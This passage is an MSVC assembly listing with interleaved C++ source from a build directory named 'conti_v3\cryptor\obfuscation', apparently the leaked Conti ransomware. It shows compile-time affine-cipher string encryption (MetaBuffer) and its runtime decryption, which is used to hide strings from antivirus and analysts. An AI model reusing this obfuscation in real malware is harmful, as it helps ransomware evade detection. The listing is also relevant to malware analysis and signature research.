  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 30	 mov	 BYTE PTR [rcx+1], 48	; 00000030H
  00007	c6 41 02 43	 mov	 BYTE PTR [rcx+2], 67	; 00000043H
  0000b	c6 41 03 11	 mov	 BYTE PTR [rcx+3], 17
  0000f	c6 41 04 43	 mov	 BYTE PTR [rcx+4], 67	; 00000043H
  00013	c6 41 05 3e	 mov	 BYTE PTR [rcx+5], 62	; 0000003eH
  00017	c6 41 06 43	 mov	 BYTE PTR [rcx+6], 67	; 00000043H
  0001b	c6 41 07 2e	 mov	 BYTE PTR [rcx+7], 46	; 0000002eH
  0001f	c6 41 08 43	 mov	 BYTE PTR [rcx+8], 67	; 00000043H
  00023	c6 41 09 43	 mov	 BYTE PTR [rcx+9], 67	; 00000043H
  00027	c6 41 0a 43	 mov	 BYTE PTR [rcx+10], 67	; 00000043H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1e 00 00 00	 mov	 eax, 30
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 68	 mov	 BYTE PTR [rcx+1], 104	; 00000068H
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 61	 mov	 BYTE PTR [rcx+3], 97	; 00000061H
  0000f	c6 41 04 1e	 mov	 BYTE PTR [rcx+4], 30
  00013	c6 41 05 55	 mov	 BYTE PTR [rcx+5], 85	; 00000055H
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 10	 mov	 BYTE PTR [rcx+7], 16
  0001f	c6 41 08 1e	 mov	 BYTE PTR [rcx+8], 30
  00023	c6 41 09 1e	 mov	 BYTE PTR [rcx+9], 30
  00027	c6 41 0a 1e	 mov	 BYTE PTR [rcx+10], 30
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 15	 sub	 ecx, 21

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 29	 mov	 BYTE PTR [rcx+1], 41	; 00000029H
  00007	c6 41 02 15	 mov	 BYTE PTR [rcx+2], 21
  0000b	c6 41 03 46	 mov	 BYTE PTR [rcx+3], 70	; 00000046H
  0000f	c6 41 04 15	 mov	 BYTE PTR [rcx+4], 21
  00013	c6 41 05 58	 mov	 BYTE PTR [rcx+5], 88	; 00000058H
  00017	c6 41 06 15	 mov	 BYTE PTR [rcx+6], 21
  0001b	c6 41 07 47	 mov	 BYTE PTR [rcx+7], 71	; 00000047H
  0001f	c6 41 08 15	 mov	 BYTE PTR [rcx+8], 21
  00023	c6 41 09 1d	 mov	 BYTE PTR [rcx+9], 29
  00027	c6 41 0a 15	 mov	 BYTE PTR [rcx+10], 21
  0002b	c6 41 0b 15	 mov	 BYTE PTR [rcx+11], 21
  0002f	c6 41 0c 15	 mov	 BYTE PTR [rcx+12], 21
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 7c 00 00 00	 mov	 eax, 124		; 0000007cH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3d	 mov	 BYTE PTR [rcx+1], 61	; 0000003dH
  00007	c6 41 02 7c	 mov	 BYTE PTR [rcx+2], 124	; 0000007cH
  0000b	c6 41 03 67	 mov	 BYTE PTR [rcx+3], 103	; 00000067H
  0000f	c6 41 04 7c	 mov	 BYTE PTR [rcx+4], 124	; 0000007cH
  00013	c6 41 05 1e	 mov	 BYTE PTR [rcx+5], 30
  00017	c6 41 06 7c	 mov	 BYTE PTR [rcx+6], 124	; 0000007cH
  0001b	c6 41 07 0c	 mov	 BYTE PTR [rcx+7], 12
  0001f	c6 41 08 7c	 mov	 BYTE PTR [rcx+8], 124	; 0000007cH
  00023	c6 41 09 7c	 mov	 BYTE PTR [rcx+9], 124	; 0000007cH
  00027	c6 41 0a 7c	 mov	 BYTE PTR [rcx+10], 124	; 0000007cH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 2d	 sub	 ecx, 45			; 0000002dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4a	 mov	 BYTE PTR [rcx+1], 74	; 0000004aH
  00007	c6 41 02 2d	 mov	 BYTE PTR [rcx+2], 45	; 0000002dH
  0000b	c6 41 03 61	 mov	 BYTE PTR [rcx+3], 97	; 00000061H
  0000f	c6 41 04 2d	 mov	 BYTE PTR [rcx+4], 45	; 0000002dH
  00013	c6 41 05 36	 mov	 BYTE PTR [rcx+5], 54	; 00000036H
  00017	c6 41 06 2d	 mov	 BYTE PTR [rcx+6], 45	; 0000002dH
  0001b	c6 41 07 3c	 mov	 BYTE PTR [rcx+7], 60	; 0000003cH
  0001f	c6 41 08 2d	 mov	 BYTE PTR [rcx+8], 45	; 0000002dH
  00023	c6 41 09 2d	 mov	 BYTE PTR [rcx+9], 45	; 0000002dH
  00027	c6 41 0a 2d	 mov	 BYTE PTR [rcx+10], 45	; 0000002dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
